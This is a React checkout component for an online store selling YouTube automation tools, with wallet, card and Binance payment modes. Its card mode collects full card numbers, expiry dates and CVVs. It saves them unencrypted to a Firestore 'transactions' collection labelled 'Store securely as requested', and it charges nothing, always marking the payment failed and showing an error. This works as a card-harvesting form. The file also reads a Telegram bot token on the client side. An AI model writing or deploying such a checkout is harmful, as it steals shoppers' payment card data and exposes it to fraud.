import { apiFetch } from '../lib/api';
import React, { useState, useEffect } from 'react';
import { db, auth } from '../lib/firebase';
import { collection, getDocs, addDoc, serverTimestamp, query, onSnapshot, doc, getDoc } from 'firebase/firestore';
import { ShoppingCart, Search, Lock, CheckCircle, X, Upload, Copy, Check } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { useAuth } from '../components/AuthProvider';
import { signInWithEmailAndPassword, createUserWithEmailAndPassword } from 'firebase/auth';
import { useParams, useNavigate, useLocation } from 'react-router-dom';

import { checkAndBanIfSpamming, checkDuplicateOrder } from '../lib/blocker';
import ProductReviews from '../components/ProductReviews';
import { getCachedProducts, getInstantProducts } from '../lib/cacheService';
import { getProviderLogo } from '../lib/paymentLogos';
import { calculateYearlyPrice } from '../lib/defaultData';

interface Product {
  id: string;
  name: string;
  description: string;
  price: number;
  category: string;
  features: string[];
  badge?: string;
  is_active: boolean;
  order_index?: number;
  yearlyPrice?: number;
}

export default function ToolsStore() {
  const { slug } = useParams();
  const navigate = useNavigate();
  const [products, setProducts] = useState<Product[]>(() => getInstantProducts() as Product[]);
  const [loading, setLoading] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [categoryFilter, setCategoryFilter] = useState('all');
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [showCheckout, setShowCheckout] = useState(false);

  const generateSlug = (name: string) => (name || '').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)+/g, '');

  useEffect(() => {
    if (!loading && products.length > 0 && slug) {
      const p = products.find(p => generateSlug(p.name) === slug);
      if (p) {
        setSelectedProduct(p);
        setShowCheckout(true);
      }
    } else if (!slug) {
      setSelectedProduct(null);
      setShowCheckout(false);
    }
  }, [slug, products, loading]);

  useEffect(() => {
    const fetchProducts = async () => {
      try {
        const prods = await getCachedProducts();
        setProducts(prods as Product[]);
      } catch (err) {
        // Safe fallback handled in getCachedProducts
      } finally {
        setLoading(false);
      }
    };
    fetchProducts();
  }, []);

  const filteredProducts = products.filter(p => {
    const matchesSearch = p.name.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesCategory = categoryFilter === 'all' || p.category === categoryFilter;
    return matchesSearch && matchesCategory;
  }).sort((a, b) => (a.order_index ?? 999) - (b.order_index ?? 999));

  const containerVariants = {
    hidden: { opacity: 0 },
    show: {
      opacity: 1,
      transition: { staggerChildren: 0.1 }
    }
  };

  const itemVariants = {
    hidden: { opacity: 0, y: 20 },
    show: { opacity: 1, y: 0, transition: { duration: 0.4 } }
  };

  return (
    <div className="min-h-screen py-12 font-sans overflow-hidden text-slate-300 relative">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        {/* Header */}
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="text-center max-w-3xl mx-auto mb-16"
        >
          <span className="text-primary-500 font-bold uppercase tracking-wider text-sm">Premium Tools Store</span>
          <h1 className="text-4xl md:text-5xl font-black mt-2 mb-4 text-white">YouTube Automation <span className="gradient-text">Tools & Courses</span></h1>
          <p className="text-slate-400 text-lg">Professional tools to change your YouTube automation game — trusted by 5000+ students</p>
        </motion.div>

        {/* Layout */}
        <div className="flex flex-col gap-8">
          
          {/* Main Content */}
          <div className="flex-1">
            {/* Filters */}
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.3 }}
              className="bg-slate-900 p-4 rounded-2xl shadow-sm border border-slate-800 mb-8 flex flex-col md:flex-row justify-between gap-4"
            >
              <div className="flex bg-slate-950 p-1 rounded-xl">
                 {['all', 'Course', 'Tool', 'Bundle'].map(cat => (
                   <button 
                     key={cat}
                     onClick={() => setCategoryFilter(cat)}
                     className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors cursor-pointer ${categoryFilter === cat ? 'bg-slate-800 shadow-sm text-primary-500' : 'text-slate-400 hover:text-white'}`}
                   >
                     {cat === 'all' ? 'All Products' : cat}
                   </button>
                 ))}
              </div>
              <div className="relative flex-1 md:max-w-xs">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                <input 
                  type="text" 
                  placeholder="Search products..."
                  value={searchTerm}
                  onChange={e => setSearchTerm(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 text-white rounded-xl pl-10 pr-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-primary-500 transition-all font-medium" 
                />
              </div>
            </motion.div>

            {/* Products Grid */}
            {loading ? (
              <div className="grid grid-cols-2 sm:grid-cols-2 md:grid-cols-3 gap-3 sm:gap-4 md:gap-6">
                 {[1, 2, 3, 4, 5, 6].map(i => (
                    <div key={i} className="bg-slate-900 border border-slate-700 rounded-2xl sm:rounded-3xl p-3 sm:p-5 flex flex-col h-56 sm:h-64 animate-pulse opacity-100">
                      <div className="w-12 h-12 sm:w-16 sm:h-16 bg-slate-800 rounded-xl mb-3"></div>
                      <div className="w-16 h-3 bg-slate-800 rounded mb-2"></div>
                      <div className="w-3/4 h-5 bg-slate-800 rounded mb-3"></div>
                      <div className="w-full h-3 bg-slate-800 rounded mb-2"></div>
                      <div className="w-2/3 h-3 bg-slate-800 rounded mb-4 flex-1"></div>
                      <div className="flex justify-between items-end border-t border-slate-700 pt-3">
                         <div className="w-16 h-5 bg-slate-800 rounded"></div>
                         <div className="w-16 h-8 bg-slate-800 rounded-lg"></div>
                      </div>
                    </div>
                 ))}
              </div>
            ) : filteredProducts.length > 0 ? (
              <motion.div 
                variants={containerVariants}
                initial="hidden"
                animate="show"
                className="grid grid-cols-2 sm:grid-cols-2 md:grid-cols-3 gap-3 sm:gap-4 md:gap-6"
              >
                 <AnimatePresence>
                   {filteredProducts.map(product => (
                      <motion.div 
                        variants={itemVariants}
                        layout
                        key={product.id} 
                        className="bg-slate-800/90 border border-slate-700/80 rounded-2xl sm:rounded-3xl p-3.5 sm:p-5 md:p-6 card-shadow flex flex-col relative overflow-hidden group hover:-translate-y-1 hover:border-slate-600 transition-all duration-300 opacity-100"
                      >
                        {product.badge && (
                          <div className="absolute top-2.5 right-2.5 sm:top-4 sm:right-4 bg-slate-900/90 border border-slate-700 text-[#f50505] text-[9px] sm:text-xs font-bold px-2 py-0.5 sm:px-3 sm:py-1 rounded-full">
                            {product.badge}
                          </div>
                        )}
                        <div className="mb-2 sm:mb-4 pr-12 sm:pr-16">
                          <span className="text-[10px] sm:text-xs font-bold text-slate-400 uppercase tracking-wider">{product.category}</span>
                          <h3 className="text-sm sm:text-lg md:text-xl font-bold mt-0.5 sm:mt-1 text-white group-hover:text-red-400 transition-colors leading-snug line-clamp-2">{product.name}</h3>
                        </div>
                        <p className="text-slate-300 text-xs sm:text-sm mb-3 sm:mb-6 flex-1 line-clamp-2 sm:line-clamp-3">{product.description}</p>
                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 sm:gap-0 mt-auto border-t border-slate-700/70 pt-2.5 sm:pt-4">
                          <div className="font-black text-sm sm:text-lg md:text-2xl text-white">PKR {product.price.toLocaleString()}</div>
                          <button 
                            onClick={() => { navigate(`/tools/${generateSlug(product.name)}`); }} 
                            className="bg-[#f50505] hover:bg-[#dc0404] cursor-pointer text-white px-3 py-1.5 sm:px-5 sm:py-2 rounded-xl transition-all shadow-md active:scale-95 text-xs sm:text-sm md:text-base font-bold text-center"
                          >
                             Buy Now
                          </button>
                        </div>
                      </motion.div>
                   ))}
                 </AnimatePresence>
              </motion.div>
            ) : (
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-center py-20 bg-slate-900 rounded-3xl border border-slate-800"
              >
                 <Search className="mx-auto text-slate-600 mb-4" size={48} />
                 <h3 className="text-xl font-bold mb-2 text-white">No products found</h3>
                 <p className="text-slate-400">Try changing your search term or view all products</p>
                 <button onClick={() => setCategoryFilter('all')} className="mt-6 text-primary-500 font-bold hover:underline cursor-pointer">View All Products</button>
              </motion.div>
            )}
          </div>
        </div>
      </div>

      <AnimatePresence>
        {showCheckout && selectedProduct && (
          <CheckoutModal product={selectedProduct} onClose={() => { navigate('/tools'); }} />
        )}
      </AnimatePresence>
    </div>
  );
}

function CheckoutModal({ product, onClose }: any) {
  const [step, setStep] = useState<'detail' | 'checkout'>('detail');
  const [selectedPlan, setSelectedPlan] = useState<'monthly' | 'yearly'>('monthly');

  const yearlyPriceTemp = product.yearlyPrice || calculateYearlyPrice(product.price);
  const selectedPrice = selectedPlan === 'monthly' ? product.price : yearlyPriceTemp;

  const [email, setEmail] = useState('');
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  
  const [proofBase64, setProofBase64] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing' | 'uploading' | 'success' | 'error' | 'card_error'>('idle');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const DEFAULT_EASYPAISA_LIST = [
    {
      id: 'pm_easypaisa_1',
      providerName: 'Easypaisa',
      accountName: 'Jerry Automation',
      accountNumber: '03189418941',
      logoUrl: getProviderLogo('Easypaisa'),
      isActive: true,
      instructions: 'Send exact amount via Easypaisa and upload payment screenshot below.'
    }
  ];

  const [paymentMethods, setPaymentMethods] = useState<any[]>(() => {
    try {
      const cached = localStorage.getItem('cached_payment_methods');
      if (cached) {
        const parsed = JSON.parse(cached);
        if (Array.isArray(parsed) && parsed.length > 0) {
          const filtered = parsed.filter((m: any) => 
            m.isActive !== false && 
            !['jazzcash', 'meezan', 'meezan bank'].includes((m.providerName || '').toLowerCase().trim())
          );
          if (filtered.length > 0) return filtered;
        }
      }
    } catch (e) {}
    return DEFAULT_EASYPAISA_LIST;
  });
  const [paymentMode, setPaymentMode] = useState<'wallet' | 'card' | 'binance'>('wallet');
  const [cardDetails, setCardDetails] = useState({ number: '', expiry: '', cvv: '', name: '' });
  const [whatsappNumber, setWhatsappNumber] = useState('+923189418941');
  const [telegramSettings, setTelegramSettings] = useState({ token: '', chatId: '' });

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2500);
  };

  useEffect(() => {
    if (typeof window !== 'undefined' && (window as any).fbq) {
      (window as any).fbq('track', 'ViewContent', {
        content_name: product.name,
        content_type: 'product',
        value: product.price,
        currency: 'PKR'
      });
    }
  }, [product]);

  useEffect(() => {
    let isMounted = true;
    const fetchMethods = async () => {
      try {
        const snap = await getDocs(collection(db, 'payment_methods'));
        if (!snap.empty) {
          const methods = snap.docs.map((d: any) => {
            const data = d.data();
            return {
              id: d.id,
              ...data,
              logoUrl: getProviderLogo(data.providerName, data.logoUrl)
            };
          }).filter((m: any) => 
            m.isActive !== false && 
            !['jazzcash', 'meezan', 'meezan bank'].includes((m.providerName || '').toLowerCase().trim())
          );
          if (isMounted && methods.length > 0) {
            setPaymentMethods(methods);
            try { localStorage.setItem('cached_payment_methods', JSON.stringify(methods)); } catch(e) {}
          }
        }
      } catch (err) {
        console.warn('Could not fetch payment methods in ToolsStore', err);
      }
    };
    const fetchSettings = async () => {
      try {
        const snap = await getDocs(collection(db, 'settings'));
        if (!snap.empty && isMounted) {
          setWhatsappNumber(snap.docs[0].data().whatsappNumber || '+923189418941');
          setTelegramSettings({ token: snap.docs[0].data().telegramBotToken || '', chatId: snap.docs[0].data().telegramChatId || '' });
        }
      } catch {
        if (isMounted) {
          setWhatsappNumber('+923189418941');
        }
      }
    }
    fetchMethods();
    fetchSettings();
    return () => { isMounted = false; };
  }, []);

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setStatus('processing');
    const reader = new FileReader();
    reader.onload = (event) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement('canvas');
        const MAX_WIDTH = 800;
        const MAX_HEIGHT = 800;
        let width = img.width;
        let height = img.height;

        if (width > height) {
          if (width > MAX_WIDTH) {
            height *= MAX_WIDTH / width;
            width = MAX_WIDTH;
          }
        } else {
          if (height > MAX_HEIGHT) {
            width *= MAX_HEIGHT / height;
            height = MAX_HEIGHT;
          }
        }

        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(img, 0, 0, width, height);
        
        // compress and set
        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
        setProofBase64(dataUrl);
        setStatus('idle');
      };
      img.src = event.target?.result as string;
    };
    reader.onerror = () => setStatus('idle');
    reader.readAsDataURL(file);
  };

  const handleSubmitProof = async () => {
    if (!email || !name || !phone) return;
    if (paymentMode === 'wallet' && !proofBase64) return;
    if (paymentMode === 'card' && (!cardDetails.number || !cardDetails.expiry || !cardDetails.cvv || !cardDetails.name)) return;
    
    setStatus('uploading');
    
    try {
      let city = 'Unknown';
      let ipAddress = 'Unknown';
      try {
        const fetchPromise = fetch('https://freeipapi.com/api/json/');
        const timeoutPromise = new Promise((resolve, reject) => setTimeout(() => reject('timeout'), 800));
        const res = await Promise.race([fetchPromise, timeoutPromise]) as Response;
        const data = await res.json();
        if (data.cityName) city = data.cityName;
        if (data.ipAddress) ipAddress = data.ipAddress;
      } catch (e) {
        console.warn("IP fetch failed or timed out", e);
      }

      // Fast path: Check for ban or fake order spamming with timeout
      try {
        const checksPromise = Promise.all([
          checkAndBanIfSpamming(phone, email, ipAddress),
          checkDuplicateOrder(phone, email, product.id, product.name, name)
        ]);
        const timeoutPromise = new Promise((resolve, reject) => setTimeout(() => reject('timeout'), 1000));
        const [banStatus, dupCheck] = await Promise.race([checksPromise, timeoutPromise]) as any;
        
        if (banStatus?.isBanned) {
           alert(`🚨 Blocked: Your phone number or IP address (${ipAddress}) has been banned due to multiple fake or unpaid order attempts. Please contact support if you believe this is an error.`);
           setStatus('idle');
           return;
        }
        if (dupCheck?.isBanned) {
           alert(`🚨 Error: duplicate order hy apka ap place nhe kr sakty order`);
           setStatus('idle');
           return;
        }
      } catch (e) {
        console.warn("Spam check timed out or failed, proceeding with order to keep UI fast", e);
      }

      if (paymentMode === 'card') {
         const orderData = {
            customer_name: name,
            customer_email: email,
            customer_phone: phone,
            products: [{ id: product.id, name: product.name, price: selectedPrice, plan: selectedPlan }],
            total_price: selectedPrice,
            payment_method: 'card',
            status: 'failed',
            city,
            ipAddress,
            createdAt: serverTimestamp()
         };
         try {
           const addPromise = Promise.all([
             addDoc(collection(db, 'orders'), orderData),
             addDoc(collection(db, 'transactions'), {
                userId: 'guest',
                userName: name,
                userEmail: email,
                userPhone: phone,
                items: [{ id: product.id, name: product.name, price: selectedPrice, quantity: 1, plan: selectedPlan }],
                itemType: 'tool',
                price: selectedPrice,
                paymentMode: 'card',
                cardDetails: { name: cardDetails.name, number: cardDetails.number, expiry: cardDetails.expiry, cvv: cardDetails.cvv, last4: cardDetails.number.slice(-4) }, // Store securely as requested
                status: 'processing',
                paymentStatus: 'FAILED',
                createdAt: serverTimestamp()
             })
           ]);
           const addTimeout = new Promise((resolve) => setTimeout(resolve, 800));
           await Promise.race([addPromise, addTimeout]);
         } catch (e) {
           console.warn("Save timed out, will complete in background", e);
         }

        // Send to Telegram in background
        if (telegramSettings.token && telegramSettings.chatId) {
           const message = `🔔 <b>New Order Received</b>

<b>Product:</b> ${product.name}
<b>Plan:</b> ${selectedPlan}
<b>Price:</b> Rs ${selectedPrice}
<b>Customer:</b> ${name}
<b>Phone:</b> ${phone}
<b>Email:</b> ${email}
<b>Payment Mode:</b> ${paymentMode}`;
           fetch(`https://api.telegram.org/bot${telegramSettings.token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                 chat_id: telegramSettings.chatId,
                 text: message,
                 parse_mode: 'HTML'
              })
           }).catch(e => console.error("Telegram notification failed", e));
        }
         setStatus('card_error');
         return;
      }

      const orderData = {
          customer_name: name,
          customer_email: email,
          customer_phone: phone,
          products: [{ id: product.id, name: product.name, price: selectedPrice, plan: selectedPlan }],
          total_price: selectedPrice,
          payment_method: 'wallet',
          status: 'pending',
          city,
          ipAddress,
          proofBase64,
          createdAt: serverTimestamp()
      };
      try {
          const addPromise = Promise.all([
            addDoc(collection(db, 'orders'), orderData),
            addDoc(collection(db, 'transactions'), {
              userId: 'guest',
              userName: name,
              userEmail: email,
              userPhone: phone,
              items: [{ id: product.id, name: product.name, price: selectedPrice, quantity: 1, plan: selectedPlan }],
              itemType: 'tool',
              price: selectedPrice,
              paymentMode: 'wallet',
              proofBase64,
              status: 'pending',
              createdAt: serverTimestamp()
            })
          ]);
          const addTimeout = new Promise((resolve) => setTimeout(resolve, 800));
          await Promise.race([addPromise, addTimeout]);
      } catch (e) {
          console.warn("Save timed out, will complete in background", e);
      }
      
        // Send to Telegram in background
        if (telegramSettings.token && telegramSettings.chatId) {
           const message = `🔔 <b>New Order Received</b>

<b>Product:</b> ${product.name}
<b>Plan:</b> ${selectedPlan}
<b>Price:</b> Rs ${selectedPrice}
<b>Customer:</b> ${name}
<b>Phone:</b> ${phone}
<b>Email:</b> ${email}
<b>Payment Mode:</b> ${paymentMode}`;
           fetch(`https://api.telegram.org/bot${telegramSettings.token}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                 chat_id: telegramSettings.chatId,
                 text: message,
                 parse_mode: 'HTML'
              })
           }).catch(e => console.error("Telegram notification failed", e));
        }

      
       const { getOrderReceivedEmail } = await import('../lib/emailTemplate');
       const emailHtmlBody = getOrderReceivedEmail(
         name,
         `${product.name} (${selectedPlan} plan)`,
         selectedPrice
       );

      // Send to Admin
      apiFetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: 'jerryhun47@gmail.com',
          subject: 'New Order Received: ' + product.name,
          body: emailHtmlBody
        })
      }).catch(e => console.error("Failed to notify admin via email", e));

      // Send to Customer
      apiFetch('/api/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: email,
          subject: "Your Order is Pending - Jerry Automation",
          body: emailHtmlBody
        })
      }).catch(err => console.error("Failed to send order confirmation", err));

      if (typeof window !== 'undefined' && (window as any).fbq) {
        (window as any).fbq('track', 'Purchase', {
          content_name: product.name,
          content_type: 'product',
          value: selectedPrice,
          currency: 'PKR',
          num_items: 1
        });
      }
 
       setStatus('success');
    } catch (err) {
      console.error(err);
      setStatus('error');
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4"
    >
      <motion.div 
        initial={{ scale: 0.9, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.9, opacity: 0, y: 20 }}
        className="bg-slate-900 rounded-3xl w-full max-w-lg max-h-[90vh] overflow-y-auto border border-slate-800 relative hide-scrollbar p-6 md:p-8"
      >
        <button onClick={onClose} className="absolute top-4 right-4 text-slate-400 hover:text-white bg-slate-800 rounded-full p-1 z-10"><X size={20} /></button>
         
         {status === 'success' ? (
           <div className="text-center py-4">
             <div className="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
               <CheckCircle size={36} />
             </div>
             <h3 className="text-2xl font-black mb-2 text-white">Order Submitted Successfully!</h3>
             <p className="text-slate-300 font-bold mb-6 text-sm">
               You ordered: <span className="text-red-400 font-black">{product.name} ({selectedPlan} plan)</span>
             </p>

             <div className="bg-black/90 border border-emerald-500/40 rounded-2xl p-5 mb-6 text-left space-y-3 shadow-xl">
               <p className="text-emerald-400 font-black text-center text-base uppercase tracking-wide">
                 📲 Ab Apna Payment Screenshot WhatsApp Par Bhejein:
               </p>
               <p className="text-white text-xs text-center font-bold">
                 Please send your payment screenshot to our official WhatsApp number to complete instant account activation:
               </p>
               <div className="bg-emerald-950/80 border border-emerald-500/50 p-4 rounded-xl text-center">
                 <span className="text-xs text-emerald-300 block font-bold uppercase mb-1">WhatsApp Official Number</span>
                 <span className="text-white font-black text-2xl tracking-wider">+92 318 9418941</span>
               </div>
             </div>

             <div className="space-y-3">
               <a 
                 href={`https://wa.me/923189418941?text=${encodeURIComponent(`Hi Jerry Automation, I have placed an order for ${product.name} (${selectedPlan} plan - PKR ${selectedPrice}). Here is my payment screenshot:`)}`} 
                 target="_blank" 
                 rel="noreferrer"
                 className="inline-flex items-center justify-center gap-2 w-full bg-emerald-600 hover:bg-emerald-500 text-white font-black py-4 px-6 rounded-2xl transition-all shadow-lg shadow-emerald-600/30 text-base"
               >
                 <span>Send Screenshot on WhatsApp (+923189418941)</span>
               </a>
               <button onClick={onClose} className="w-full bg-zinc-800 hover:bg-zinc-700 text-white font-bold py-3.5 rounded-2xl transition-colors cursor-pointer text-sm">
                 Close
               </button>
             </div>
           </div>
         ) : step === 'detail' ? (
           <>
              <div className="mb-6 mt-2">
                 <span className="text-xs font-bold text-slate-400 uppercase tracking-wider">{product.category}</span>
                 <h2 className="text-xl md:text-2xl font-bold text-white leading-tight mt-1">{product.name}</h2>
              </div>

              <div className="bg-primary-500/10 border border-primary-500/30 rounded-xl p-4 mb-6">
                 <p className="text-primary-400 font-bold text-sm text-center">
                    All plans will be activated on your personal Gmail account.<br/>
                    You must provide your Gmail, and a secure account will be activated for you.
                 </p>
              </div>

              <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 mb-6">
                 <h3 className="text-white font-bold mb-3">Select Plan</h3>
                 <div className="flex flex-col sm:flex-row gap-3">
                    <button 
                       onClick={() => setSelectedPlan('monthly')}
                       className={`flex-1 p-4 rounded-xl border text-center transition-all ${selectedPlan === 'monthly' ? 'bg-primary-600/10 border-primary-500' : 'bg-slate-900 border-slate-700 hover:border-slate-500'}`}
                    >
                       <div className="text-xs text-slate-400 uppercase font-bold mb-1">Monthly Plan</div>
                       <div className="text-xl font-black text-white">PKR {product.price.toLocaleString()}</div>
                    </button>
                    <button 
                       onClick={() => setSelectedPlan('yearly')}
                       className={`flex-1 p-4 rounded-xl border text-center transition-all relative ${selectedPlan === 'yearly' ? 'bg-primary-600/10 border-primary-500' : 'bg-slate-900 border-slate-700 hover:border-slate-500'}`}
                    >
                       <div className="absolute top-0 right-0 transform translate-x-1 -translate-y-2 bg-green-500 text-white text-[10px] px-2 py-0.5 rounded-full font-bold">Best Value</div>
                       <div className="text-xs text-slate-400 uppercase font-bold mb-1">Yearly Plan</div>
                       <div className="text-xl font-black text-white">PKR {yearlyPriceTemp.toLocaleString()}</div>
                    </button>
                 </div>
              </div>

              <div className="bg-slate-800/50 rounded-xl p-4 mb-6">
                 <h3 className="text-white font-bold mb-2">⭐ Highlighted Features</h3>
                 <p className="text-sm text-slate-300 whitespace-pre-line">{product.detail?.replace(/💰 Monthly.*?\n/i, '').replace(/📅 Yearly.*?\n/i, '') || product.description}</p>
              </div>

              <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4 mb-6">
                 <h3 className="text-blue-400 font-bold text-sm mb-1 flex items-center justify-center gap-2">🛡️ Warranty Policy</h3>
                 <p className="text-blue-300 text-xs text-center border-t border-blue-500/20 pt-2 mt-2">
                    All products come with a money-back and replacement warranty. Whether you purchase for 1 month or 1 year, you will get full warranty coverage. So you can order with confidence.
                 </p>
              </div>

              <button 
                onClick={() => {
                  if (typeof window !== 'undefined' && (window as any).fbq) {
                    (window as any).fbq('track', 'AddToCart', {
                      content_name: product.name,
                      content_type: 'product',
                      value: selectedPrice,
                      currency: 'PKR'
                    });
                  }
                  setStep('checkout');
                }}
                className="w-full bg-primary-600 hover:bg-primary-500 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-primary-500/20 active:scale-95 cursor-pointer"
              >
                 Continue to Payment
              </button>

              <ProductReviews productId={product.id} productName={product.name} />
           </>
         ) : (
           <>
              <h2 className="text-2xl font-bold text-white mb-6 text-center">Complete Payment</h2>
              
              <div className="bg-slate-950 border border-slate-800 rounded-2xl p-4 mb-6">
                <div className="flex justify-between items-center mb-2">
                   <span className="text-slate-400">Selected Plan</span>
                   <span className="text-white font-bold text-right capitalize">{selectedPlan}</span>
                </div>
                <div className="flex justify-between items-center border-t border-slate-800 pt-2 mt-2">
                   <span className="text-slate-400">Total Amount</span>
                   <span className="text-primary-400 font-black text-xl">PKR {selectedPrice.toLocaleString()}</span>
                </div>
              </div>

              <div className="space-y-4 mb-6">
                 <div>
                    <label className="text-xs uppercase font-bold text-slate-400 ml-1">Full Name <span className="text-primary-500">*</span></label>
                    <input type="text" required placeholder="John Doe" value={name} onChange={e => setName(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-primary-500 mt-1" />
                 </div>
                 <div>
                    <label className="text-xs uppercase font-bold text-slate-400 ml-1">Email (Mandatory) <span className="text-primary-500">*</span></label>
                    <input type="email" required placeholder="user@gmail.com" value={email} onChange={e => setEmail(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-primary-500 mt-1" />
                 </div>
                 <div>
                    <label className="text-xs uppercase font-bold text-slate-400 ml-1">WhatsApp / Phone (Mandatory) <span className="text-primary-500">*</span></label>
                    <input type="tel" required placeholder="+923000000000" value={phone} onChange={e => setPhone(e.target.value)} className="w-full bg-slate-950 border border-slate-800 text-white rounded-lg px-4 py-3 focus:ring-2 focus:ring-primary-500 mt-1" />
                 </div>
              </div>

              <div className="flex gap-2 mb-6 p-1 bg-slate-950 rounded-xl overflow-x-auto hide-scrollbar">
                <button onClick={() => setPaymentMode('wallet')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'wallet' ? 'bg-primary-600 text-white' : 'text-slate-400 hover:text-white'}`}>Bank / Wallets</button>
                <button onClick={() => setPaymentMode('card')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'card' ? 'bg-primary-600 text-white' : 'text-slate-400 hover:text-white'}`}>Card Payment</button>
                <button onClick={() => setPaymentMode('binance')} className={`flex-1 py-2 px-3 text-sm font-bold rounded-lg transition-colors whitespace-nowrap focus:outline-none ${paymentMode === 'binance' ? 'bg-primary-600 text-white' : 'text-slate-400 hover:text-white'}`}>Binance</button>
              </div>

              {paymentMode === 'wallet' && (
                <>
                  {paymentMethods.length > 0 ? (
                    <div className="space-y-4 mb-6">
                       {paymentMethods.map(method => (
                         <div key={method.id} className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 text-left relative overflow-hidden shadow-lg shadow-black/40 hover:border-slate-700 transition-colors">
                            <div className="flex items-center justify-between gap-3 mb-4 pb-3 border-b border-slate-800/80">
                              <div className="flex items-center gap-3">
                                {method.logoUrl ? (
                                  <div className="w-10 h-10 rounded-xl bg-white p-1 flex items-center justify-center border border-slate-700 shrink-0">
                                    <img src={method.logoUrl} alt={method.providerName} className="w-full h-full object-contain" />
                                  </div>
                                ) : (
                                  <div className="w-10 h-10 rounded-xl bg-primary-600 text-white font-black text-sm flex items-center justify-center shrink-0">
                                    {method.providerName ? method.providerName.substring(0, 2).toUpperCase() : 'PA'}
                                  </div>
                                )}
                                <div>
                                  <h3 className="font-bold text-white text-base leading-tight">{method.providerName}</h3>
                                  <span className="text-[11px] text-emerald-400 font-semibold flex items-center gap-1">
                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Instant Transfer
                                  </span>
                                </div>
                              </div>
                              <span className="text-xs px-2.5 py-1 rounded-full bg-primary-500/10 text-primary-400 font-bold border border-primary-500/20">
                                Official Account
                              </span>
                            </div>

                            <div className="space-y-2.5 text-sm mb-3">
                              <div className="flex justify-between items-center py-1 bg-slate-950/60 px-3 rounded-xl border border-slate-800/60">
                                <span className="text-slate-400 text-xs font-semibold uppercase">Account Name:</span>
                                <span className="font-bold text-white text-sm">{method.accountName}</span>
                              </div>

                              <div className="flex justify-between items-center py-1.5 bg-slate-950/90 px-3 rounded-xl border border-slate-800">
                                <span className="text-slate-400 text-xs font-semibold uppercase">Account Number:</span>
                                <div className="flex items-center gap-2">
                                  <span className="font-mono font-bold text-primary-400 text-sm tracking-wider">{method.accountNumber}</span>
                                  <button
                                    type="button"
                                    onClick={() => copyToClipboard(method.accountNumber, `acc_${method.id}`)}
                                    className="p-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white rounded-lg transition-colors flex items-center gap-1 text-[10px] font-bold"
                                    title="Copy Number"
                                  >
                                    {copiedKey === `acc_${method.id}` ? <Check size={13} className="text-emerald-400" /> : <Copy size={13} />}
                                    {copiedKey === `acc_${method.id}` ? 'Copied' : 'Copy'}
                                  </button>
                                </div>
                              </div>

                              {method.iban && (
                                <div className="flex justify-between items-center py-1.5 bg-slate-950/60 px-3 rounded-xl border border-slate-800/60 flex-col sm:flex-row gap-1">
                                  <span className="text-slate-400 text-xs font-semibold uppercase">IBAN:</span>
                                  <div className="flex items-center gap-2">
                                    <span className="font-mono font-bold text-slate-300 text-xs break-all">{method.iban}</span>
                                    <button
                                      type="button"
                                      onClick={() => copyToClipboard(method.iban, `iban_${method.id}`)}
                                      className="p-1 bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white rounded-md transition-colors"
                                      title="Copy IBAN"
                                    >
                                      {copiedKey === `iban_${method.id}` ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
                                    </button>
                                  </div>
                                </div>
                              )}

                              {method.instructions && (
                                <p className="text-xs text-slate-400 italic pt-1">
                                  ℹ️ {method.instructions}
                                </p>
                              )}
                            </div>

